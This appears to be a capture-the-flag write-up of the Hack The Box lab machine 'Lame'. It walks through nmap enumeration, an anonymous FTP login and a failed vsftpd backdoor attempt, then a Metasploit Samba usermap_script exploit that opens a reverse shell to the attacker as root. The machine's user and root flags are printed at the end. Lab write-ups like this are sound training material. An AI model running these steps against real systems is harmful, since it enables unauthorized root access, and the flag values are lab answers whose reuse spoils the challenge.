## Lame 10.10.10.3
### 0. Refs
  + https://www.youtube.com/watch?v=Ru8YxARNS7M
  + [HTB's writeup](./Lame.pdf)
### 1. Enumeration
- Run nmap and output to file txt:
```
$ nmap -sV -A -oN 10.10.10.3.txt 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-15 16:01 EDT
Nmap scan report for 10.10.10.3
Host is up (0.037s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d22h57m35s, deviation: 0s, median: -2d22h57m35s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-08-12T13:04:37-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.20 ms 10.10.14.1
2   40.81 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.92 seconds
```
- Run Zenmap (nmap with GUI) using the default command (see [output](./zenmap_output.pdf)):
```
nmap -T4 -A -v 10.10.10.3
```
- Ports/Hosts:
  + 21/tcp  open  ftp         vsftpd 2.3.4
  + 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  + 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  + 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

## 2. Exploitation
### A. vsftp 2.3.4
- Install fpt
```
$ sudo apt install ftp
```
- Connect to 10.10.10.3 using ftp and login as anonymous with empty password:
```
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)Name (10.10.10.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
- Current dir is root and there is no (hidden) file.
```
ftp> pwd
257 "/"
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```
- Refs:
  + https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor
  + https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
```
$ searchsploit vsftpd 2.3.4
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | exploits/unix/remote/17491.rb
----------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
- Fix Cannot allocate memory - infocmp: https://www.optiv.com/blog/create-a-budget-friendly-virtual-private-server-with-a-metasploit-instance
```
root@dungnguyen:~# free
              total        used        free      shared  buff/cache   available
Mem:        2043288     1530416       79884      250856      432988      117232
Swap:       1045500     1043388        2112
root@dungnguyen:~# cd /var
root@dungnguyen:/var# touch swap.img
root@dungnguyen:/var# chmod 600 swap.img
root@dungnguyen:/var# dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
1000+0 records in
1000+0 records out
1048576000 bytes (1.0 GB, 1000 MiB) copied, 2.58249 s, 406 MB/s
root@dungnguyen:/var# mkswap /var/swap.img 
Setting up swapspace version 1, size = 1000 MiB (1048571904 bytes)
no label, UUID=d8f5d883-575e-45a2-8e09-4b49f144dc8f
root@dungnguyen:/var# swapon /var/swap.img
root@dungnguyen:/var# free
              total        used        free      shared  buff/cache   available
Mem:        2043288     1569248       78200      249820      395840       79452
Swap:       2069496     1059080     1010416
```
- Exploit the target using metasploit but failed:
 ```
$ msfdb start
[+] Starting database
$ msfconsole
msf5 > search vsftp 2.3.4

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Check  Description
   ----                                                      ---------------  ----       -----  -----------
   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.

[*] Exploit completed, but no session was created.
 ```
 ### B. Samba 3.0.20
 - Refs:
    + https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script
    + https://resources.infosecinstitute.com/hacking-and-gaining-access-to-linux-by-exploiting-samba-service/#gref
    
 ```
 $ searchsploit samba 3.0.20
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------- ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command  | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                      | exploits/linux/remote/7701.txt
----------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
 ```
 - Exploit Samba. Type `shell` to get shell, then obtain `user.txt` and `root.txt`:
 ```
 msf5 > search samba 3.0.20

Matching Modules
================

   Name                                                   Disclosure Date  Rank       Check  Description
   ----                                                   ---------------  ----       -----  -----------
   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
   auxiliary/admin/smb/samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                                    normal     Yes    List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
   exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   exploit/osx/samba/trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   exploit/solaris/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   exploit/unix/misc/distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/http/sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
   exploit/windows/license/calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations


msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.18:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 68AN8OJQ8EqEjNIk;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "68AN8OJQ8EqEjNIk\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.18:4444 -> 10.10.10.3:51225) at 2019-08-15 17:20:44 -0400

shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell

sh-3.2# id
id
uid=0(root) gid=0(root)

sh-3.2# cat home/makis/user.txt
cat home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5

sh-3.2# cat root/root.txt
cat root/root.txt
92caac3be140ef409e45721348a4e9df
 ```
## 3. Flags
`69454a937d94f5f0225ea00acd2e84c5` and `92caac3be140ef409e45721348a4e9df`






